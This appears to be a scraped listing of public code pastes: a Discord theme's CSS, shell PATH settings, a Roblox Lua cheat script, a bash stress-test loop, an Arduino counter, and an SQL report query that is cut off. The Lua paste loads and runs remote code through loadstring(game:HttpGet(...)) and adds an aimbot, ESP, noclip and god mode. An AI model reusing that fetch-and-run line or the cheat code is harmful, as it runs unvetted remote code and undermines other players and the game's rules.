ease-in-out;pointer-events:none;z-index:-1;border-radius:999px;border-top-right-radius:0;border-bottom-right-radius:0}.voiceUser__07f91 .username__07f91{color:hsla(0,0%,100%,.5);transition:all .1s ease-in-out}.voiceUser__07f91 .usernameSpeaking__07f91{color:#fff}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .privateChannels__35e86{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.2))}.visual-refresh .scroller__99e7c{background:rgba(0,0,0,0);margin:0}.visual-refresh .privateChannelsHeaderContainer__99e7c{color:var(--hsl-main-color)}.visual-refresh .headerText__99e7c{display:flex;text-transform:uppercase;font-size:14px;font-weight:700;align-items:center}.visual-refresh .headerText__99e7c::before{content:"""";height:2px;flex-grow:1;background:linear-gradient(to left, currentColor 50%, transparent);margin-right:5px}.visual-refresh .headerText__99e7c::after{content:"""";height:2px;flex-grow:1;background:linear-gradient(to right, currentColor 50%, transparent);margin-left:5px}.visual-refresh :is(.plusIcon__675e5,.privateChannelRecipientsInviteButtonIcon__99e7c){color:var(--hsl-main-color)}.visual-refresh :is(.plusIcon__675e5,.privateChannelRecipientsInviteButtonIcon__99e7c):hover{color:var(--hsl-hover-color)}.empty__99e7c{fill:var(--text-normal);opacity:.15}.visual-refresh .interactive__972a0{transition:all .15s ease-in-out;border-radius:4px}.visual-refresh .interactive__972a0::before{content:"""";position:absolute;top:0;right:100%;bottom:0;left:0;transition:all .15s ease-in-out;z-index:-1;border-radius:4px}.visual-refresh .interactive__972a0:hover{background:var(--background-modifier-accent)}.visual-refresh .interactive__972a0.interactiveSelected__972a0{background-color:rgba(0,0,0,0);color:var(--interactive-active)}.visual-refresh .interactive__972a0.interactiveSelected__972a0::before{right:0;background:var(--hsl-main-color);animation:cv-channel-select .3s ease-in-out}.visual-refresh .interactive__972a0.interactiveSelected__972a0 .activityStatusText__972a0{color:var(--interactive-active)}.visual-refresh .interactive__972a0.interactiveSelected__972a0 .activityStatusText__972a0 strong{color:var(--interactive-active)}/*! ClearVision v7.0.1 by ClearVision Team */.platform-win .sidebar_c48ade{border-radius:0}.visual-refresh .sidebar_c48ade{background:rgba(0,0,0,0)}.visual-refresh .sidebar_c48ade:after{display:none}:is(.theme-light,.theme-dark,.theme-darker,.theme-midnight),:is(.theme-light,.theme-dark,.theme-darker,.theme-midnight):is(.theme-light,.theme-dark){--text-normal: hsl(from var(--normal-text) h calc(var(--saturation-factor, 1) * s) l/alpha);--text-muted: hsl(from var(--muted-text) h calc(var(--saturation-factor, 1) * s) l/alpha);--text-link: var(--hsl-main-color);--text-brand: var(--hsl-main-color);--text-positive: var(--hsl-success-color);--text-danger: var(--hsl-danger-color);--hsl-background-shading: hsl(from var(--background-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-card-shading: hsl(from var(--card-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-popout-shading: hsl(from var(--popout-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-modal-shading: hsl(from var(--modal-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-input-shading: hsl(from var(--input-shading) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-input-border-shading: hsl(from var(--hsl-input-shading) h s l/.1)}:root{--hsl-main-color: hsl(from var(--main-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-hover-color: hsl(from var(--hover-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-success-color: hsl(from var(--success-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-warning-color: hsl(from var(--warning-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-danger-color: hsl(from var(--danger-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-info-color: hsl(from var(--info-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-online-color: hsl(from var(--online-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-idle-color: hsl(from var(--idle-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-dnd-color: hsl(from var(--dnd-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-streaming-color: hsl(from var(--streaming-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-offline-color: hsl(from var(--offline-color) h calc(var(--saturation-factor, 1) * s) l/alpha);--hsl-channel-normal: var(--channel-normal);--hsl-channel-muted: var(--channel-muted);--hsl-channel-hover: var(--channel-hover);--hsl-channel-selected: var(--channel-selected);--hsl-channel-selected-bg: var(--channel-selected-bg);--hsl-channel-unread: var(--channel-unread);--hsl-channel-unread-hover: var(--channel-unread-hover);--font-primary: var(--main-font);--font-display: var(--main-font);--font-code: var(--code-font);--focus-primary: var(var(--focus-color));--main-color: #2780e6;--hover-color: #1e63b3;--success-color: #43b581;--warning-color: #fff;--danger-color: #982929;--info-color: #fff;--online-color: #43b581;--idle-color: #faa61a;--dnd-color: #982929;--streaming-color: #593695;--offline-color: #808080;--background-shading-percent: 100%;--background-image: url(https://clearvision.github.io/images/sapphire.jpg);--background-position: center;--background-size: cover;--background-attachment: fixed;--background-filter: saturate(calc(var(--saturation-factor, 1) * 1));--user-popout-image: var(--background-image);--user-popout-position: var(--background-position);--user-popout-size: var(--background-size);--user-popout-attachment: var(--background-attachment);--user-popout-filter: var(--background-filter);--user-modal-image: var(--background-image);--user-modal-position: var(--background-position);--user-modal-size: var(--background-size);--user-modal-attachment: var(--background-attachment);--user-modal-filter: var(--background-filter);--home-icon: url(https://clearvision.github.io/icons/discord.svg);--home-size: cover;--main-font: ""gg sans"", Whitney, ""Helvetica Neue"", Helvetica, Arial, sans-serif;--code-font: Consolas, ""gg mono"", ""Liberation Mono"", Menlo, Courier, monospace;--channel-normal: var(--interactive-normal);--channel-muted: var(--interactive-muted);--channel-hover: var(--interactive-hover);--channel-selected: var(--interactive-active);--channel-selected-bg: var(--main-color);--channel-unread: var(--main-color);--channel-unread-hover: var(--hover-color);--focus-color: var(--main-color)}:is(.theme-light,.theme-dark .theme-light){--background-shading: rgba(252, 252, 252, 0.3);--card-shading: rgba(252, 252, 252, 0.3);--popout-shading: rgba(252, 252, 252, 0.7);--modal-shading: rgba(252, 252, 252, 0.5);--input-shading: rgba(0, 0, 0, 0.3);--normal-text: #36363c;--muted-text: #75757e}:is(.theme-dark,.theme-light .theme-dark){--background-shading: rgba(0, 0, 0, 0.4);--card-shading: rgba(0, 0, 0, 0.2);--popout-shading: rgba(0, 0, 0, 0.6);--modal-shading: rgba(0, 0, 0, 0.4);--input-shading: rgba(255, 255, 255, 0.05);--normal-text: #d8d8db;--muted-text: #aeaeb4}:is(.theme-darker,.theme-light .theme-darker){--background-shading: rgba(0, 0, 0, 0.6);--card-shading: rgba(0, 0, 0, 0.3);--popout-shading: rgba(0, 0, 0, 0.7);--modal-shading: rgba(0, 0, 0, 0.5);--input-shading: rgba(255, 255, 255, 0.05);--normal-text: #fbfbfb;--muted-text: #94949c}:is(.theme-midnight,.theme-light .theme-midnight){--background-shading: rgba(0, 0, 0, 0.8);--card-shading: rgba(0, 0, 0, 0.4);--popout-shading: rgba(0, 0, 0, 0.8);--modal-shading: rgba(0, 0, 0, 0.6);--input-shading: rgba(255, 255, 255, 0.05);--normal-text: #dcdcde;--muted-text: #86868e}"
tEVL9TWj,Addings,cydside,Bash,Tuesday 17th of June 2025 10:59:04 AM CDT,"export HISTCONTROL=ignoreboth:erasedup
export PATH=$PATH:/usr/local/go/bin
export PATH=$PATH:/home/cyd/go/bin

profile
export PATH=$PATH:/usr/local/go/bin

minify v2.21.3
https://github.com/tdewolff/minify/releases?page=2"
MM4a776e,Untitled,zn4v_,Lua,Tuesday 17th of June 2025 10:37:30 AM CDT,"local OrionLib = loadstring(game:HttpGet(""https://raw.githubusercontent.com/jensonhirst/Orion/main/source""))()
local Players = game:GetService(""Players"")
local player = Players.LocalPlayer

-- مفتاح التفعيل الصحيح
local correctKey = ""XlCOw-5mcj3q3yo-2Teff0b34""

-- نافذة طلب مفتاح التفعيل
local KeyWindow = OrionLib:MakeWindow({
    Name = ""Fltr Hub - Activation"",
    HidePremium = true,
    SaveConfig = false,
    IntroEnabled = false,
    NoClose = true,
})

local keyValid = false

KeyWindow:MakeTab({
    Name = ""Activation"",
}):AddTextbox({
    Name = ""Enter Key"",
    PlaceholderText = ""ادخل مفتاح التفعيل هنا"",
    Callback = function(inputKey)
        if inputKey == correctKey then
            keyValid = true
            OrionLib:MakeNotification({
                Name = ""Success"",
                Content = ""تم التفعيل بنجاح! جاري فتح الواجهة..."",
                Image = ""rbxassetid://4483345998"",
                Time = 3
            })
            KeyWindow:Destroy() -- إغلاق نافذة التفعيل
        else
            OrionLib:MakeNotification({
                Name = ""Error"",
                Content = ""المفتاح غير صحيح، حاول مرة أخرى."",
                Image = ""rbxassetid://4483345998"",
                Time = 3
            })
        end
    end,
})

-- نوقف تنفيذ السكربت حتى يدخل المستخدم المفتاح الصحيح
repeat
    wait()
until keyValid

-- الآن يستمر السكربت الأصلي (واجهة الـ Hub)
-- Fltr Hub | Created by Majid (مجودي)
-- تم تجميع السكربتات كاملة بدون روابط

-- المكتبات والخدمات
local OrionLib = loadstring(game:HttpGet(""https://raw.githubusercontent.com/jensonhirst/Orion/main/source""))()
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local Workspace = game:GetService(""Workspace"")
local player = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

-- واجهة الهب
local Window = OrionLib:MakeWindow({
Name = ""Fltr Hub"",
HidePremium = false,
SaveConfig = true,
ConfigFolder = ""FltrHubConfig"",
IntroEnabled = true,
IntroText = ""Welcome to Fltr Hub 💀"",
Icon = ""rbxassetid://4483345998"",
IntroIcon = ""rbxassetid://4483345998""
})


---

-- 🎯 Aimbot Tab

local AimbotTab = Window:MakeTab({ Name = ""🎯 Aimbot"", Icon = """", PremiumOnly = false })

local aimbotEnabled = false
local aimButtonGui

AimbotTab:AddButton({
Name = ""🔫 تفعيل Aimbot"",
Callback = function()
aimbotEnabled = not aimbotEnabled

if aimButtonGui == nil then  
		aimButtonGui = Instance.new(""ScreenGui"", game.CoreGui)  
		local btn = Instance.new(""TextButton"", aimButtonGui)  
		btn.Size = UDim2.new(0, 150, 0, 40)  
		btn.Position = UDim2.new(0.5, -75, 0.9, 0)  
		btn.Text = ""Aimbot: OFF""  
		btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)  
		btn.TextColor3 = Color3.new(1, 1, 1)  
		btn.TextSize = 18  
		btn.MouseButton1Click:Connect(function()  
			aimbotEnabled = not aimbotEnabled  
			btn.Text = aimbotEnabled and ""Aimbot: ON"" or ""Aimbot: OFF""  
		end)  
	end  

	RunService.RenderStepped:Connect(function()  
		if aimbotEnabled then  
			local closest, dist = nil, math.huge  
			for _, p in pairs(Players:GetPlayers()) do  
				if p ~= player and p.Character and p.Character:FindFirstChild(""Head"") then  
					local mag = (p.Character.Head.Position - player.Character.Head.Position).Magnitude  
					if mag < dist then  
						closest = p  
						dist = mag  
					end  
				end  
			end  
			if closest then  
				Camera.CFrame = CFrame.new(Camera.CFrame.Position, closest.Character.Head.Position)  
			end  
		end  
	end)  
end

})

local circleVisible, circleRadius = false, 100
local circleObj

AimbotTab:AddToggle({
Name = ""⭕ إظهار دائرة التصويب"",
Default = false,
Callback = function(val)
circleVisible = val
if val then
circleObj = Drawing.new(""Circle"")
circleObj.Thickness = 2
circleObj.Radius = circleRadius
circleObj.Color = Color3.new(1, 0, 0)
circleObj.Filled = false
circleObj.Visible = true
RunService.RenderStepped:Connect(function()
if circleVisible and circleObj then
circleObj.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
end
end)
elseif circleObj then
circleObj:Remove()
circleObj = nil
end
end
})

AimbotTab:AddTextbox({
Name = ""🎯 حجم الدائرة"",
Default = ""100"",
Callback = function(val)
local num = tonumber(val)
if num and circleObj then
circleObj.Radius = num
end
end
})

AimbotTab:AddButton({
Name = ""🌈 تغيير لون الدائرة (RGB)"",
Callback = function()
spawn(function()
while circleVisible and circleObj do
for i = 0, 1, 0.01 do
circleObj.Color = Color3.fromHSV(i, 1, 1)
wait()
end
end
end)
end
})

AimbotTab:AddButton({
Name = ""🎯 تصغير مؤشر السلاح"",
Callback = function()
if player.PlayerGui:FindFirstChild(""Crosshair"") then
player.PlayerGui.Crosshair.Size = UDim2.new(0, 15, 0, 15)
end
end
})

local ESPTab = Window:MakeTab({
    Name = ""👁️ ESP"",
    Icon = """",
    PremiumOnly = false
})

local function isWanted(player)
    -- تحقق من وجود leaderstats.Wanted وقيمته أكبر من 0
    local stats = player:FindFirstChild(""leaderstats"")
    if stats and stats:FindFirstChild(""Wanted"") then
        local val = tonumber(stats.Wanted.Value)
        return val and val > 0
    end
    return false
end

local function createESP(target)
    if not target.Character then return end
    local head = target.Character:FindFirstChild(""Head"")
    if not head or head:FindFirstChild(""ESP_Info"") then return end

    local bill = Instance.new(""BillboardGui"", head)
    bill.Name = ""ESP_Info""
    bill.Size = UDim2.new(0, 150, 0, 80)
    bill.AlwaysOnTop = true
    bill.LightInfluence = 0
    bill.StudsOffset = Vector3.new(0, 2.5, 0)

    local function makeLabel(posY)
        local label = Instance.new(""TextLabel"", bill)
        label.Size = UDim2.new(1, 0, 0, 15)
        label.Position = UDim2.new(0, 0, 0, posY)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.new(1, 1, 1)
        label.TextSize = 13
        label.Font = Enum.Font.Gotham
        label.TextStrokeTransparency = 0.5
        label.TextWrapped = true
        label.Text = """"
        return label
    end

    local nameLabel = makeLabel(0)
    local userLabel = makeLabel(15)
    local distLabel = makeLabel(30)
    local teamLabel = makeLabel(45)
    local statusLabel = makeLabel(60)

    nameLabel.Text = target.Name
    userLabel.Text = ""@"" .. target.Name

    local RunService = game:GetService(""RunService"")
    local updater = RunService.RenderStepped:Connect(function()
        if target.Character and target.Character:FindFirstChild(""Head"") and player.Character and player.Character:FindFirstChild(""Head"") then
            local dist = (target.Character.Head.Position - player.Character.Head.Position).Magnitude
            distLabel.Text = ""Distanz: "" .. math.floor(dist) .. "" studs""

            -- الفريق
            if target.Team then
                local team = tostring(target.Team):lower()
                teamLabel.Text = target.Team.Name
                if team == ""police"" then
                    teamLabel.TextColor3 = Color3.fromRGB(0, 0, 255)
                elseif team == ""criminals"" then
                    teamLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                else
                    teamLabel.TextColor3 = Color3.new(1, 1, 1)
                end
            else
                teamLabel.Text = ""Unknown""
                teamLabel.TextColor3 = Color3.new(1, 1, 1)
            end

            -- الحالة المطلوب
            if isWanted(target) then
                statusLabel.Text = ""Wanted""
                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
            else
                statusLabel.Text = ""Not Wanted""
                statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
            end
        end
    end)

    bill.AncestryChanged:Connect(function()
        if not bill:IsDescendantOf(game) then
            updater:Disconnect()
        end
    end)
end

-- إضافة ESP للاعبين الموجودين
for _, p in pairs(Players:GetPlayers()) do
    if p ~= player then
        p.CharacterAdded:Connect(function()
            wait(1)
            createESP(p)
        end)
        if p.Character then
            createESP(p)
        end
    end
end

-- إضافة لأي لاعب جديد
Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        wait(1)
        createESP(plr)
    end)
end)

-- إضافة ESP للاعبين الموجودين
for _, p in pairs(Players:GetPlayers()) do
    if p ~= player then
        p.CharacterAdded:Connect(function()
            wait(1)
            createESP(p)
        end)
        if p.Character then
            createESP(p)
        end
    end
end

-- للاعبين الجدد
Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        wait(1)
        createESP(plr)
    end)
end)
-- 🧍 Player Tab

local PlayerTab = Window:MakeTab({ Name = ""🧍 Player"", Icon = """", PremiumOnly = false })

PlayerTab:AddButton({
Name = ""🔁 إعادة تعيين اللاعب"",
Callback = function()
local hum = player.Character and player.Character:FindFirstChild(""Humanoid"")
if hum then hum.Health = 0 end
end
})

PlayerTab:AddButton({
Name = ""🚪 تفعيل Noclip"",
Callback = function()
RunService.Stepped:Connect(function()
for _, part in ipairs(player.Character:GetDescendants()) do
if part:IsA(""BasePart"") then
part.CanCollide = false
end
end
end)
end
})

PlayerTab:AddButton({
Name = ""❤️ منع الموت"",
Callback = function()
local hum = player.Character:WaitForChild(""Humanoid"")
hum:GetPropertyChangedSignal(""Health""):Connect(function()
if hum.Health < 100 then hum.Health = 100 end
end)
end
})
---

-- 🚗 Car Tab

local CarTab = Window:MakeTab({ Name = ""🚗 Car"", Icon = """", PremiumOnly = false })

CarTab:AddButton({
Name = ""⬆️ رفع السيارة"",
Callback = function()
local vehicle = Workspace:FindFirstChild(""Vehicles""):FindFirstChild(player.Name)
if not vehicle then return end
for _, part in ipairs(vehicle:GetDescendants()) do
if part:IsA(""SpringConstraint"") then
part.FreeLength += 1.5
end
end
end
})

CarTab:AddButton({
Name = ""⬇️ خفض السيارة"",
Callback = function()
local vehicle = Workspace:FindFirstChild(""Vehicles""):FindFirstChild(player.Name)
if not vehicle then return end
for _, part in ipairs(vehicle:GetDescendants()) do
if part:IsA(""SpringConstraint"") then
part.FreeLength -= 1.5
end
end
end
})

CarTab:AddButton({
Name = ""🔁 إعادة السيارة للوضع الطبيعي"",
Callback = function()
local vehicle = Workspace:FindFirstChild(""Vehicles""):FindFirstChild(player.Name)
if not vehicle then return end
for _, part in ipairs(vehicle:GetDescendants()) do
if part:IsA(""SpringConstraint"") then
part.FreeLength = 2.5
end
end
end
})

CarTab:AddButton({
Name = ""🚘 رسبنة السيارة أمامك"",
Callback = function()
local carModel = game.ReplicatedStorage:WaitForChild(""MyCar""):Clone()
carModel.Parent = Workspace
carModel:SetPrimaryPartCFrame(player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -10))
end
})

CarTab:AddButton({
Name = ""🪑 الجلوس تلقائي في السيارة"",
Callback = function()
local seat = Workspace:FindFirstChildWhichIsA(""VehicleSeat"", true)
if seat then
player.Character:MoveTo(seat.Position)
wait(1)
seat:Sit(player.Character:WaitForChild(""Humanoid""))
end
end
})


---

-- 🏦 Robbery Status Tab

local RobberyTab = Window:MakeTab({ Name = ""🏦 Robbery"", Icon = """", PremiumOnly = false })

RobberyTab:AddButton({
Name = ""💰 التحقق من حالة البنك والمجوهرات"",
Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local Workspace = game:GetService(""Workspace"")

local jewelryUIs = {}

local function createShadow(frame)
    local shadow = Instance.new(""ImageLabel"")
    shadow.Size = UDim2.new(1, 10, 1, 10)
    shadow.Position = UDim2.new(0, 5, 0, 5)
    shadow.BackgroundTransparency = 1
    shadow.Image = ""rbxassetid://6014261993"" 
    shadow.ImageColor3 = Color3.new(0, 0, 0)
    shadow.ImageTransparency = 0.5
    shadow.ZIndex = 0
    shadow.Parent = frame
end

local player = Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

local existingGui = playerGui:FindFirstChild(""RobberyNotifier"")
if existingGui then
    existingGui:Destroy()
end

local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""RobberyNotifier""
screenGui.Parent = playerGui

local frame = Instance.new(""Frame"")
frame.Size = UDim2.new(0, 400, 0, 60)
frame.Position = UDim2.new(0, 10, 0, 10)
frame.BackgroundColor3 = Color3.new(30/255, 30/255, 30/255)
frame.BorderSizePixel = 0
frame.Parent = screenGui

local uiCorner = Instance.new(""UICorner"")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = frame

local uiGradient = Instance.new(""UIGradient"")
uiGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.new(40/255, 40/255, 40/255)),
    ColorSequenceKeypoint.new(1, Color3.new(50/255, 50/255, 50/255))
}
uiGradient.Parent = frame

createShadow(frame) 

local bankLabel = Instance.new(""TextLabel"")
bankLabel.Size = UDim2.new(1, -20, 1, 0)
bankLabel.Position = UDim2.new(0, 10, 0, 0)
bankLabel.BackgroundTransparency = 1
bankLabel.TextColor3 = Color3.new(255/255, 255/255, 255/255)
bankLabel.Text = ""Bank Status: Checking...""
bankLabel.Font = Enum.Font.Gotham
bankLabel.TextSize = 18
bankLabel.Parent = frame

local bankRobbery = Workspace.Robberies:WaitForChild(""BankRobbery"")
local lightGreen = bankRobbery:WaitForChild(""LightGreen"")
local lightRed = bankRobbery:WaitForChild(""LightRed"")
local jewelerRobbery = Workspace.Robberies:WaitForChild(""JewelerRobbery"")
local robbables = jewelerRobbery:WaitForChild(""Robbables"")

local bankWasClosed = false

local function checkBankStatus()
    local greenBrickColor = lightGreen.BrickColor
    local redColor = lightRed.Color

    if greenBrickColor == BrickColor.new(""Camo"") then
        bankLabel.Text = ""Bank Status: Open""
        bankLabel.TextColor3 = Color3.new(0/255, 255/255, 0/255)
        if bankWasClosed then
            bankLabel.Text = ""Bank Status: Open (Just Opened!)""
            spawn(function()
                wait(3)
                if bankLabel.Text == ""Bank Status: Open (Just Opened!)"" then
                    bankLabel.Text = ""Bank Status: Open""
                end
            end)
        end
        bankWasClosed = false
    else
        bankLabel.Text = ""Bank Status: Closed""
        bankLabel.TextColor3 = Color3.new(255/255, 255/255, 0/255)
        bankWasClosed = true
    end
end

local function checkJewelryStatus()
    for model, uiFrame in pairs(jewelryUIs) do
        if model:GetAttribute(""Broken"") then
            uiFrame:Destroy()
            jewelryUIs[model] = nil
        end
    end

    task.spawn(function() 
        for _, model in pairs(robbables:GetChildren()) do
            if model:IsA(""Model"") then
                local enabled = model:GetAttribute(""Enabled"")
                local broken = model:GetAttribute(""Broken"")
    
                if enabled and not broken and not jewelryUIs[model] then
                    local uiFrame = Instance.new(""Frame"")
                    uiFrame.Size = UDim2.new(0, 400, 0, 50)
                    uiFrame.Position = UDim2.new(0, 10, 0, 80 + (#jewelryUIs * 60))
                    uiFrame.BackgroundColor3 = Color3.new(40/255, 40/255, 40/255)
                    uiFrame.BorderSizePixel = 0
                    uiFrame.Parent = screenGui
    
                    local uiCorner = Instance.new(""UICorner"")
                    uiCorner.CornerRadius = UDim.new(0, 8) -- Rounded corners
                    uiCorner.Parent = uiFrame
    
                    local uiGradient = Instance.new(""UIGradient"")
                    uiGradient.Color = ColorSequence.new{
                        ColorSequenceKeypoint.new(0, Color3.new(50/255, 50/255, 50/255)),
                        ColorSequenceKeypoint.new(1, Color3.new(60/255, 60/255, 60/255))
                    }
                    uiGradient.Parent = uiFrame
    
                    local uiLabel = Instance.new(""TextLabel"")
                    uiLabel.Size = UDim2.new(1, -20, 1, 0)
                    uiLabel.Position = UDim2.new(0, 10, 0, 0)
                    uiLabel.BackgroundTransparency = 1
                    uiLabel.TextColor3 = Color3.new(0/255, 200/255, 0/255)
                    uiLabel.Text = model.Name .. "" (Not Robbed)""
                    uiLabel.Font = Enum.Font.Gotham
                    uiLabel.TextSize = 16
                    uiLabel.Parent = uiFrame
    
                    createShadow(uiFrame)
    
                    jewelryUIs[model] = uiFrame
                end
            end
        end
    end)
end

RunService.Heartbeat:Connect(function()
    checkBankStatus()
    checkJewelryStatus()
end)

checkBankStatus()
checkJewelryStatus()
end
})


---

OrionLib:Init()

"
fVrQGUtN,Stress Test - Bash,Abrar_Al_Samit,Bash,Tuesday 17th of June 2025 10:17:45 AM CDT,"for((i=1;;i++)); do
	echo $i
	./gen $i > in
	diff -w <(./exe1 < in) <(./exe2 < in) || break
done"
Ax3PRAMK,**Count Display** rev_01,pleasedontcode,Arduino,Tuesday 17th of June 2025 09:15:53 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Count Display**
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-06-17 14:14:58

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Écrire un programme pour un compteur modulo 24 */
	/* avec Var1 unité et var2 dizaine */
/****** SYSTEM REQUIREMENT 2 *****/
	/* Créez un programme de comptage modulo 24 en */
	/* utilisant Var1 pour les unités et var2 pour les */
	/* dizaines et avec cathode commune */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <Arduino.h>
#include <Wire.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

// Define variables for units and tens
int var1 = 0; // Units
int var2 = 0; // Tens

// Function to update the display (for demonstration purposes)
void updateDisplay(int units, int tens) {
    // This function would contain code to update a 7-segment display
    // For example, using digitalWrite to light up segments
}

/****** SETUP FUNCTION *****/
void setup(void)
{
    // Initialize serial communication for debugging
    Serial.begin(9600);
    
    // Initialize display or other components as needed
    // For example: display.begin();
}

/****** LOOP FUNCTION *****/
void loop(void)
{
    // Increment the counter
    var1++;
    
    // Check if var1 exceeds 9 (units)
    if (var1 >= 10) {
        var1 = 0; // Reset units
        var2++; // Increment tens
    }
    
    // Check if var2 exceeds 2 (tens for modulo 24)
    if (var2 >= 3) {
        var2 = 0; // Reset tens
    }
    
    // Update the display with the current values
    updateDisplay(var1, var2);
    
    // Print the current count for debugging
    Serial.print(""Count: "");
    Serial.print(var2);
    Serial.print(var1);
    Serial.println();
    
    // Delay for a while to make the counting visible
    delay(1000); // Adjust delay as necessary
}

/* END CODE */"
C7C7bL03,3500 form,temaon_lieto,SQL,Tuesday 17th of June 2025 08:54:40 AM CDT,"WITH protocol_procedures AS (SELECT cascade_lvl03_surgical_procedures.*
                             FROM cascade_lvl03_surgical_procedures
                             WHERE cascade_lvl03_surgical_procedures.procedure_performed_date BETWEEN '2024-01-01 00:00:00' AND '2025-01-01 23:59:59'
                               AND cascade_lvl03_surgical_procedures.legal_entity_id = 3382),
     groups_mappers AS (SELECT dict_table3500service_mappers.*
                        FROM dict_table3500service_mappers
                        WHERE dict_table3500service_mappers.line_number != '4.7'),
     main_table AS (SELECT MAX(mappers.surgery_type_title)                                                                                  AS surgery_name,
                           mappers.line_number                                                                                              AS line_number,
                           mappers.major                                                                                                    AS major,
                           mappers.minor                                                                                                    AS minor,
                           countIf(DISTINCT (sp.id), (sp.patient_id IS NOT NULL AND
                                                      (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                      ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                       (mappers.has_addition_icd10_codes = 0 OR dtaim.code != ''))))                        AS surgeries_count,
                           countIf(DISTINCT (sp.id), (sp.patient_id IS NOT NULL AND
                                                      (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                      ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                       (mappers.has_addition_icd10_codes = 0 OR dtaim.code != '')) AND
                                                      (CASE
                                                           WHEN mappers.line_number IN ('13.2', '13.0')
                                                               THEN mappers.line_number = '13.0' AND patient_age < 18
                                                           WHEN mappers.line_number = '12.0' THEN false
                                                           ELSE patient_age < 18 END)))                                                     AS under_17_years_count,
                           countIf(DISTINCT (sp.patient_id), (sp.patient_id IS NOT NULL AND
                                                              (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                              ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                               (mappers.has_addition_icd10_codes = 0 OR dtaim.code != '')) AND
                                                              (sp.discharge_disposition_code = 'death')))                                   AS deaths_count,
                           countIf(DISTINCT (sp.patient_id), (sp.patient_id IS NOT NULL AND
                                                              (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                              ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                               (mappers.has_addition_icd10_codes = 0 OR dtaim.code != '')) AND
                                                              sp.discharge_disposition_code = 'death' AND (CASE
                                                                                                               WHEN mappers.line_number IN ('13.2', '13.0')
                                                                                                                   THEN mappers.line_number = '13.0' AND patient_age < 18
                                                                                                               WHEN mappers.line_number = '12.0'
                                                                                                                   THEN false
                                                                                                               ELSE patient_age < 18 END))) AS under_17_years_deaths_count,
                           countIf(DISTINCT (sp.patient_id), (sp.patient_id IS NOT NULL AND
                                                              (mappers.line_number != '7.2' OR sp.patient_age < 1) AND
                                                              ((mappers.has_icd10_codes = 0 OR dtim.code != '') AND
                                                               (mappers.has_addition_icd10_codes = 0 OR dtaim.code != '')) AND
                                                              sp.is_village =
                                                              1))                                                                           AS villagers_count

                    FROM groups_mappers mappers
                             LEFT JOIN protocol_procedures sp ON mappers.code = sp.service_code
                             LEFT JOIN dict_table3500_icd10_mappers dtim
                                       ON dtim.code = sp.icd10_code AND mappers.mapper_id = dtim.mapper_id
                             LEFT JOIN dict_table3500_addition_icd10_mappers dtaim
                                       ON dtaim.code = sp.icd10_code AND mappers.mapper_id = dtaim.mapper_id
                    GROUP BY mappers.line_number, mappers.major, mappers.minor
                    ORDER BY (mappers.major, mappers.minor) ASC),
     header_table AS (SELECT 'Усього операцій, у тому числі:'    AS surgery_name,
                             '1.0'                               AS line_number,
                             1                                   AS major,
                             0                                   AS minor,
                             SUM(mt.surgeries_count)             AS surgeries_count,
                             SUM(mt.under_17_years_count)        AS under_17_years_count,
                             SUM(mt.deaths_count)                AS deaths_count,
                             SUM(mt.under_17_years_deaths_count) AS under_17_years_deaths_count,
                             SUM(mt.villagers_count)             AS villagers_count
                      FROM main_table mt
                      WHERE mt.minor = 0)
SELECT header_table.*
FROM header_table
UNION ALL
SELECT main_table.*
